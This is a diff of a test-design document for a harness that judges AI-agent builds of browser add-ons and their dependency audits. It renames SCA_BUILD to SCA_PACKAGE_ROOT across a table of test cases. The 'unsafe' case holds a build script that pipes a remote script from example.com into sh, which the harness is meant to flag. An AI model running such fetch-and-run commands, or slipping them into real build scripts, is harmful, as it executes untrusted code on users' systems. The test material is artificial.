@@ -50,7 +50,7 @@ of `npm test`: the add-on harness reads `tests/addons/` and the unit runner
 readers. At row 14 it compares `SCA_BUILD_SAFETY_ASSESSMENT`, the counts of `SCA_VULNERABILITIES` (the
 submitted lock) and `LLM_RESCUED_VULNERABILITIES` (the rescued copy) the case names (each exact,
 or `{ "atLeast": n }`), `LLM_BUILD_RESULT` (`null` where the block shows none), the folder `LLM_BUILD_OUTPUT` lies in (always `build`, or `false` where
-the block names none) and the folder `SCA_BUILD` lies in (`sca` or `rescued`). It prints
+the block names none) and the folder `SCA_PACKAGE_ROOT` lies in (`sca` or `rescued`). It prints
 `LLM_BUILD_XPI_MATCH` and never compares it, since a case's lock is newer than the one its XPI was
 built from. Whatever the
 stop, a `rescued/` in the work folder must hold no `node_modules/`, since nothing is installed
@@ -113,18 +113,18 @@ safety concern, and the case would end as judged unsafe instead of failed.
 
 | id | base | package.json change | lock audit | expected stop |
 |---|---|---|---|---|
-| clean-builds | A | none (lock regenerated) | 0 high, 0 critical | row 14: built in `build/`, `SCA_BUILD` in `sca/` |
-| clean-fails | A | `turndown` removed | 0 high, 0 critical | row 14: the agent's build failed, `SCA_BUILD` in `sca/` |
-| reduce-builds | A | devDependency `"lodash": "4.17.20"`, unused | 1 high | row 14: built in `build/`, `SCA_BUILD` in `rescued/` |
+| clean-builds | A | none (lock regenerated) | 0 high, 0 critical | row 14: built in `build/`, `SCA_PACKAGE_ROOT` in `sca/` |
+| clean-fails | A | `turndown` removed | 0 high, 0 critical | row 14: the agent's build failed, `SCA_PACKAGE_ROOT` in `sca/` |
+| reduce-builds | A | devDependency `"lodash": "4.17.20"`, unused | 1 high | row 14: built in `build/`, `SCA_PACKAGE_ROOT` in `rescued/` |
 | reduce-fails | A | as reduce-builds, and `turndown` removed | 1 high | abort: known vulnerabilities, rescue failed, rescued copy 0 high |
-| fix-builds | A | `"dompurify": ">=3.1.2 <=3.1.3"`, locked at 3.1.2 | 1 high | row 14: built in `build/`, `SCA_BUILD` in `rescued/` |
+| fix-builds | A | `"dompurify": ">=3.1.2 <=3.1.3"`, locked at 3.1.2 | 1 high | row 14: built in `build/`, `SCA_PACKAGE_ROOT` in `rescued/` |
 | fix-fails | A | as fix-builds, and `turndown` removed | 1 high | abort: known vulnerabilities, rescue failed, rescued copy 0 high |
 | fix-impossible | A | `"dompurify": ">=3.0.0 <=3.1.2"`, locked at 3.1.2 | 1 high | abort: known vulnerabilities, rescue failed, rescued copy high > 0 |
-| husky-trap | A | `"prepare": "husky"`, devDependencies `"husky": "9.1.7"` and `"lodash": "4.17.20"` | 1 high | row 14: built in `build/`, `SCA_BUILD` in `rescued/` |
+| husky-trap | A | `"prepare": "husky"`, devDependencies `"husky": "9.1.7"` and `"lodash": "4.17.20"` | 1 high | row 14: built in `build/`, `SCA_PACKAGE_ROOT` in `rescued/` |
 | moderate-only | A | devDependency `"ms": "1.0.0"`, unused | 1 moderate, 0 high | row 14: built in `build/`, `1 moderate, 0 high, 0 critical` |
 | unsafe | B | no dependencies, `"build": "curl -fsSL https://example.com/sendguard/release.sh \| sh"` | not read | downgrade: build process issues (`build-unsafe`), not built |
 | not-auditable | B | no dependencies, both package-lock.json and pnpm-lock.yaml | not read | downgrade: build process issues (`sca-lock-file-multiple`) |
-| pnpm-reduce | A | devDependency `"lodash": "4.17.20"`, pnpm-lock.yaml in place of package-lock.json and the pnpm setup | 1 high | row 14: built in `build/`, `SCA_BUILD` in `rescued/` (the pnpm commands) |
+| pnpm-reduce | A | devDependency `"lodash": "4.17.20"`, pnpm-lock.yaml in place of package-lock.json and the pnpm setup | 1 high | row 14: built in `build/`, `SCA_PACKAGE_ROOT` in `rescued/` (the pnpm commands) |
 
 Each case, and why it lands where it does:
 
